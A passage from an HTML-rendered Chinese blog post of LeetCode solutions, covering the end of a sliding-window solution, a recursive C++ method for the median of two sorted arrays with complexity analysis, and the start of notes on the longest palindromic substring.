class="keyword">while</span>(hash[s[j]]&gt;<span class="number">1</span>)<span class="comment">//当有重复字符</span></span><br><span class="line">            &#123;</span><br><span class="line">                hash[s[i++]]--;<span class="comment">//左指针移动，对应字符出现次数减1</span></span><br><span class="line">            &#125;</span><br><span class="line">            res=<span class="built_in">max</span>(res,j-i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-寻找两个正序数组的中位数-困难"><a href="https://leetcode.cn/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a>（困难）</h2><blockquote><p>中位数：有序数组元素个数为奇数时，中位数为最中间的数，若元素个数为偶数时，中位数为中间两个数的平均数</p></blockquote><p><strong>朴素算法</strong>：将两个数组合并，<code>sort</code>排序后遍历寻找中位数，时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mo><mi>log</mi><mo>⁡</mo></mo><mrow></mrow></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log_{}{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.24414em;"><span style="top:-1.75586em;margin-right:0.05em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span><span class="mclose">)</span></span></span></span>，不满足题目要求</p><p><strong>优化</strong>：本质上我们需要找到两数组排序后第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k=\frac{m+n}{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1473309999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.802331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span>小的数，我们可以从题目要求的时间复杂度入手<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log(m+n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，尝试二分的思想。</p><p>（若A、B数组的元素个数均大于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时）各取A、B数组中第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素，若A中所取元素小于B中所取元素，即A中元素取少了，B中元素取多了，则A中前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素必定在要取中位数前（换句话说中位数不可能出现在这些元素中），我们可以不再考虑这些元素。反之也成立，由此可将k的规模减少一半，在剩下的数据中寻找第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>−</mo><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">k-\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>小的元素，将其作为新的k值继续递归即可。</p><p>（若A、B数组的元素个数有一个小于<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>时，不可能全部小于）那取小数组的最后一个元素与大数组的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素，若前者小于后者，则中位数不可能出在前一个数组中，即中位数为大数组的第<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>−</mo><mi>m</mi></mrow><annotation encoding="application/x-tex">k-m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>个数，若后者小于前者，则后数组前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素中不存在中位数。删去前<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>k</mi><mn>2</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{k}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2251079999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个元素即可。</p><p><strong>时间复杂度</strong>：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>=</mo><mfrac><mrow><mi>m</mi><mo>+</mo><mi>n</mi></mrow><mn>2</mn></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k=\frac{m+n}{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1473309999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.802331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">m</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span>，每次递归k的规模减小一半，则时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mo>+</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log(m+n))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></p><p><strong>注意</strong>：考虑数组越界问题，<code>find()</code>函数实现时确保前一个数组一定小于后一个数组，这样可以避免很多边界问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, vector&lt;<span class="type">int</span>&gt;&amp; nums2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> total=nums1.<span class="built_in">size</span>()+nums2.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(total%<span class="number">2</span>==<span class="number">0</span>)<span class="comment">//m+n为偶数，中位数为中间两数平均</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> left=<span class="built_in">findknumber</span>(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,total/<span class="number">2</span>);<span class="comment">//中位左数</span></span><br><span class="line">            <span class="type">int</span> right=<span class="built_in">findknumber</span>(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,total/<span class="number">2</span>+<span class="number">1</span>);<span class="comment">//中位右数</span></span><br><span class="line">            <span class="keyword">return</span> (left+right)/<span class="number">2.0</span>;<span class="comment">//注意细节，返回浮点数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums1,<span class="number">0</span>,nums2,<span class="number">0</span>,total/<span class="number">2</span>+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//自定义递归函数findknumber</span></span><br><span class="line"><span class="comment">//含义为寻找从下标i开始的nums1数组和从下标为j开始的nums2数组合并后第k大的数</span></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findknumber</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> i, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> j,<span class="type">int</span> k)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//确保nums1长度小于nums2，便于判断边界</span></span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>()-i&gt;nums2.<span class="built_in">size</span>()-j) <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums2,j,nums1,i,k);</span><br><span class="line">        <span class="comment">//当短数组遍历完时(注意细节)</span></span><br><span class="line">        <span class="keyword">if</span>(nums1.<span class="built_in">size</span>()==i) <span class="keyword">return</span> nums2[j<span class="number">-1</span>+k];</span><br><span class="line">        <span class="comment">//当k为1时，正常情况的递归出口</span></span><br><span class="line">        <span class="keyword">if</span>(k==<span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">min</span>(nums1[i],nums2[j]);</span><br><span class="line">        <span class="comment">//正常递归情况</span></span><br><span class="line">        <span class="type">int</span> si=<span class="built_in">min</span>(i+k/<span class="number">2</span>,<span class="built_in">int</span>(nums1.<span class="built_in">size</span>())); <span class="comment">//考虑短数组长度小于k/2 </span></span><br><span class="line">        <span class="type">int</span> sj=j+k/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums1[si<span class="number">-1</span>]&gt;nums2[sj<span class="number">-1</span>])<span class="comment">//因si、sj保存的是第几个数，需-1</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums1,i,nums2,sj,k-(sj-j));<span class="comment">//舍弃nums2前半段</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">findknumber</span>(nums1,si,nums2,j,k-(si-i));<span class="comment">//舍弃nums1前半段</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>有一种利用二分非递归的做法，可将时间复杂度优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>m</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>m</mi><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(\log(min(m,n)))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span>，但细节处较为繁琐，待我学学再做补充</p></blockquote><h2 id="5-最长回文子串"><a href="https://leetcode.cn/problems/longest-palindromic-substring/">5. 最长回文子串</a></h2><p>经典题目，做法很多，有<a href="https://zhuanlan.zhihu.com/p/80323989">Manacher算法</a>时间复杂度可优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span>，但该算法几乎只可解决此类问题，并不实用，字符串哈希搭配二分<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><msub><mo><mi>log</mi><mo>⁡</mo></mo><mrow></mrow></msub><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\log_{}{n})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:-0.24414em;"><span style="top:-1.75586em;margin-right:0.05em;"><span class="pstrut" style="height:2em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span><span class="mclose">)</span></span></span></span>（以后补充）</p><p>因为该题给出的数据量较小，此处我们选择一种便于理解的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的算法，此题用DP也可过但需要额外的空间复杂度</p><p><strong>基本思路</strong>：回文串指左右对称的字符串，大体分为奇数型和偶数型，遍历整个字符串，选取中间节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>，若为奇数型，从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mi>i</mi><mo>−</mo><mn>1</mn><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[i-1,i+1\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose delimcenter" style="top:0em;">]</span></span></span></span></span> 向左右寻找，直到遇到不同字符或数组边界，若为偶数型，从<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">[</mo><mi>i</mi><mo separator="true">,</mo><mi>i</mi><mo>+</mo><mn>1</mn><mo fence="true">]</mo></mrow><annotation encoding="application/x-tex">\left[i,i+1\right]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">[</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" 